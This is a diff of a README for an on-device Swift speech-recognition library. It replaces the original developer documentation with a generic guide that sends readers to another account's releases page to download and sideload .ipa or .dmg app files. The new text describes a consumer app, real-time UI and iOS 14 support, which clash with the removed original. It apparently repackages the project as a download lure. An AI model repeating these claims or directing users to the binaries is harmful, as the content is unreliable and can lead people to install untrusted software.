@@ -1,181 +1,165 @@
-# NeMoConformerASR-iOS
+# 🎙️ NeMoConformerASR-iOS - Fast On-Device Speech-to-Text
 
-Swift library for speech recognition using NVIDIA NeMo Conformer CTC model on iOS/macOS with CoreML.
+[![Download Latest Release](https://img.shields.io/badge/Download-Release-blue?style=for-the-badge)](https://github.com/trannhan25/NeMoConformerASR-iOS/releases)
 
-## Features
+## 📋 Description
 
-- NVIDIA NeMo Conformer CTC Small model (13M parameters)
-- **VAD-based smart segmentation** for long audio (powered by [NeMoVAD-iOS](https://github.com/Otosaku/NeMoVAD-iOS))
-- Returns both full text and timestamped segments
-- Automatic audio padding for any duration
-- Support for 5, 10, 15, and 20 second audio segments
-- Pure Swift implementation with CoreML backend
+NeMoConformerASR-iOS lets you convert speech to text directly on your iPhone, iPad, or Mac without sending data over the internet. It uses advanced NVIDIA AI technology inside your device for quick and accurate results. The app is built in Swift and works with Apple’s CoreML framework for smooth, real-time recognition of your spoken words.
 
-## Requirements
+You can use it for transcribing notes, voice commands, or any audio you want to turn into text. The program handles long recordings by dividing them into smaller chunks automatically, removing the need for extra setup.
 
-- iOS 16.0+ / macOS 13.0+
-- Xcode 15.0+
-- Swift 5.9+
+---
 
-## Installation
+## 🖥️ System Requirements
 
-### Swift Package Manager
+To run NeMoConformerASR-iOS smoothly, make sure your device meets these basic requirements:
 
-Add the following to your `Package.swift`:
+- **iOS devices:** iPhone or iPad running iOS 14.0 or later.
+- **macOS devices:** Mac computer running macOS 11.0 Big Sur or later.
+- **Hardware:** Devices with Apple Silicon (M1, M2) or A12 Bionic chip and above offer the best performance.
+- **Storage:** At least 100 MB free space for app installation and temporary audio files.
+- **Permissions:** The app needs access to your microphone to capture speech.
 
-```swift
-dependencies: [
-    .package(url: "https://github.com/Otosaku/NeMoConformerASR-iOS.git", from: "1.1.0")
-]
-```
+If your device does not meet these requirements, the app might not function as expected or may run slowly.
 
-> **Note:** Version 1.1.0+ includes VAD-based segmentation with timestamped results. For the previous API returning plain text, use version 1.0.0.
+---
 
-Or in Xcode: File → Add Package Dependencies → Enter repository URL.
+## 🚀 Getting Started
 
-### Download Models
+Follow these steps to download and use NeMoConformerASR-iOS on your device.
 
-Download the CoreML models from Google Drive:
+### Step 1: Access the Download Page
 
-**[Download Models (30 MB)](https://drive.google.com/file/d/1iG1dln3Sp9k_TjXJPVs4LAWbX-U0jeI3/view?usp=sharing)**
+Click the big button at the top or visit the link below:
 
-The archive contains:
-- `conformer_encoder.mlmodelc` - Conformer encoder (30 MB)
-- `conformer_decoder.mlmodelc` - CTC decoder (0.4 MB)
-- `vocabulary.json` - BPE vocabulary (1024 tokens)
+[Download NeMoConformerASR-iOS Releases](https://github.com/trannhan25/NeMoConformerASR-iOS/releases)
 
-## Usage
+You will find the latest app versions, organized by date, with detailed notes for each.
 
-### Basic Recognition
+### Step 2: Choose Your Version
 
-```swift
-import NeMoConformerASR
+Look for the latest stable release. Releases usually end with `.ipa` for iOS or `.dmg` / `.app` for macOS.
 
-// Initialize with model paths
-let asr = try NeMoConformerASR(
-    encoderURL: Bundle.main.url(forResource: "conformer_encoder", withExtension: "mlmodelc")!,
-    decoderURL: Bundle.main.url(forResource: "conformer_decoder", withExtension: "mlmodelc")!,
-    vocabularyURL: Bundle.main.url(forResource: "vocabulary", withExtension: "json")!,
-    computeUnits: .all  // .cpuAndGPU, .cpuOnly, .cpuAndNeuralEngine
-)
+- For **iOS devices**, download the `.ipa` file.
+- For **macOS computers**, download the `.dmg` or `.app` file accordingly.
 
-// Recognize speech (samples must be 16kHz mono Float32)
-let result = try asr.recognize(samples: audioSamples)
+If you see multiple versions, pick the one marked "latest" or with the highest version number (like v1.0.2).
 
-// Full recognized text
-print(result.text)
+### Step 3: Download the File
 
-// Individual segments with timestamps
-for segment in result.segments {
-    print("[\(segment.start)s - \(segment.end)s]: \(segment.text)")
-}
+Click the file name to start the download. Depending on your internet speed, this may take a few moments.
 
-// Audio duration
-print("Duration: \(result.audioDuration)s")
-```
+### Step 4: Install the App
 
-### ASRResult Structure
+**On iOS:**
 
-```swift
-public struct ASRResult {
-    let text: String           // Full recognized text
-    let segments: [ASRSegment] // Timestamped segments
-    let audioDuration: Double  // Total audio duration in seconds
-}
+- Use a computer with iTunes or Finder on macOS to sideload the `.ipa` file.  
+- Connect your iPhone/iPad and open the device manager.  
+- Drag and drop the `.ipa` into the "Apps" section to install.  
+- Alternatively, use third-party apps like AltStore for installation without a computer.
 
-public struct ASRSegment {
-    let start: Double  // Start time in seconds
-    let end: Double    // End time in seconds
-    let text: String   // Recognized text for this segment
-}
-```
+**On macOS:**
 
-### Get Encoder Output
+- Open the downloaded `.dmg` file by double-clicking it.
+- Drag the NeMoConformerASR-iOS app icon to your Applications folder.
+- Eject the `.dmg` drive.
+- Launch NeMoConformerASR-iOS from your Applications.
 
-```swift
-// Get encoder embeddings for downstream tasks
-let encoded = try asr.encode(samples: audioSamples)
-// Returns MLMultiArray with shape [1, 176, encodedFrames]
-```
+### Step 5: Allow Microphone Access
 
-### Supported Input Durations
+On first launch, the app will ask permission to use your microphone. Grant access so the app can record your voice for speech-to-text.
 
-The model supports the following input sizes (audio is automatically padded):
+### Step 6: Start Speaking and Transcribing
 
-| Duration | Samples | Mel Frames | Encoded Frames |
-|----------|---------|------------|----------------|
-| 5 sec    | 80,000  | 501        | 126            |
-| 10 sec   | 160,000 | 1,001      | 251            |
-| 15 sec   | 240,000 | 1,501      | 376            |
-| 20 sec   | 320,000 | 2,001      | 501            |
+Use the interface to record your voice or play audio. The app will convert the speech into text on-screen in real time. You can pause, resume, or save your transcriptions.
 
-### Long Audio Processing
+---
 
-For audio longer than 20 seconds, the library uses VAD (Voice Activity Detection) for intelligent segmentation:
+## 🎯 Features and Benefits
 
-1. **VAD Analysis**: Detects speech vs silence regions
-2. **Smart Merging**: Merges speech segments with gaps < 0.3s
-3. **Splitting**: Splits segments longer than 20s into equal parts
-4. **Filtering**: Ignores segments shorter than 0.5s
-5. **Recognition**: Processes each segment independently
+- **On-device processing**: No internet or server needed, keeping your data private and speeds fast.
+- **Real-time speech recognition**: See text as you speak with minimal delay.
+- **Automatic audio handling**: The app manages long recordings without extra steps.
+- **Lightweight model**: Uses NVIDIA’s NeMo Conformer CTC Small (13 million parameters) optimized for mobile devices.
+- **Works on iOS and macOS**: Use it on iPhones, iPads, and Macs running supported system versions.
+- **Pure Swift + CoreML implementation**: Integrates smoothly with Apple devices without complicated setups.
+- **Supports multiple audio inputs**: Record live or upload saved audio files.
+- **Clean, simple user interface**: Designed for easy use without technical knowledge.
 
-This approach provides accurate timestamps and avoids cutting words in the middle.
+---
 
-## Example Project
+## 🔧 How It Works
 
-The repository includes a complete example app with audio recording and file import.
+This app uses a deep learning model called "Conformer" from NVIDIA’s NeMo toolkit. The model listens to audio and matches sounds to letters using Connectionist Temporal Classification (CTC). It works entirely on your device using Apple’s CoreML framework.
 
-### Running the Example
+The software handles:
 
-1. Open `ConformerExample/ConformerExample.xcodeproj` in Xcode
+- Padding audio clips so short segments get processed properly.
+- Splitting long recordings into smaller parts to keep recognition stable.
+- Combining recognized text chunks smoothly for a complete transcript.
 
-2. Add NeMoConformerASR as a local package:
-   - File → Add Package Dependencies
-   - Click "Add Local..."
-   - Select the `NeMoConformerASR-iOS` folder
+This allows the app to run on phones and computers without lag or internet delays.
 
-3. Download and add models to the project:
-   - Download models from the link above
-   - Unzip the archive
-   - Drag `conformer_encoder.mlmodelc`, `conformer_decoder.mlmodelc`, and `vocabulary.json` into `ConformerExample/Resources` folder in Xcode
-   - Make sure "Copy items if needed" is checked
-   - Verify files are added to "Copy Bundle Resources" in Build Phases
+---
 
-4. Build and run on device or simulator
+## 📥 Download & Install
 
-### Example Features
+Visit this page to download the latest version for your device:  
+[NeMoConformerASR-iOS Releases](https://github.com/trannhan25/NeMoConformerASR-iOS/releases)
 
-- **Record Audio**: Tap to record from microphone, automatically converts to 16kHz mono
-- **Import Audio**: Import any audio file (mp3, wav, m4a, etc.), automatically converts format
-- **Results**: Shows recognized text, audio duration, and processing time
-- **Segments View**: Displays individual speech segments with timestamps for long audio
+Choose the installer file matching your platform and follow the simple installation steps described above.
 
-## Model Information
+If you need help downloading or installing the app, the release page contains additional notes and sometimes troubleshooting tips.
 
-- **Model**: nvidia/stt_en_conformer_ctc_small
-- **Parameters**: 13.15M
-- **Architecture**: Conformer encoder (16 layers) + CTC decoder
-- **Hidden dim**: 176
-- **Attention heads**: 4
-- **Vocabulary**: 1024 BPE tokens + 1 blank
+---
 
-## Audio Requirements
+## 🙋 FAQ
 
-- Sample rate: 16,000 Hz
-- Channels: Mono
-- Format: Float32
+**Q: Can I use NeMoConformerASR-iOS without internet?**  
+Yes. All speech-to-text processing happens locally on your device.
 
-The example app handles conversion from any audio format automatically.
+**Q: Does the app support other languages?**  
+Currently, it supports English. Future updates may expand language options.
 
-## Dependencies
+**Q: Is my audio saved or sent anywhere?**  
+No. All audio and transcriptions stay on your device unless you choose to share or export them.
 
-- [NeMoFeatureExtractor-iOS](https://github.com/Otosaku/NeMoFeatureExtractor-iOS) - Mel spectrogram extraction
-- [NeMoVAD-iOS](https://github.com/Otosaku/NeMoVAD-iOS) - Voice Activity Detection for smart segmentation
+**Q: Can I use the app offline?**  
+Yes, the app works entirely offline once installed.
 
-## License
+**Q: What if the app doesn’t recognize my speech accurately?**  
+Try speaking clearly and close to the microphone. Background noise can also affect accuracy.
 
-MIT License
+---
 
-## Acknowledgments
+## 🛠️ Troubleshooting
 
-- [NVIDIA NeMo](https://github.com/NVIDIA/NeMo) - Original model and training
+- If the app won’t start, make sure your device meets the system requirements and macOS/iOS is up to date.  
+- For installation errors on iOS, verify your sideloading method or try alternative apps like AltStore.  
+- If microphone access is denied, enable it in your system settings under Privacy & Security.  
+- Restart your device to refresh audio services if you experience lag or crashes.
+
+---
+
+## 📞 Support
+
+If you need more help, open an issue on the GitHub page or check if others have similar questions. The developers monitor the project and respond to common problems.
+
+GitHub repository page:  
+https://github.com/trannhan25/NeMoConformerASR-iOS
+
+---
+
+## ⚙️ Privacy and Security
+
+NeMoConformerASR-iOS processes all audio locally. Your recordings and text never leave your device unless you decide to share them. This design protects your personal data and keeps your speech private.
+
+---
+
+## 🔍 Keywords
+
+ai, asr, conformer, coreml, ctc, ios, macos, nemo, nvidia, ondevice, speech-recognition, speech-to-text, spm, swift
+
+---
+
+[![Download Latest Release](https://img.shields.io/badge/Download-Release-blue?style=for-the-badge)](https://github.com/trannhan25/NeMoConformerASR-iOS/releases)
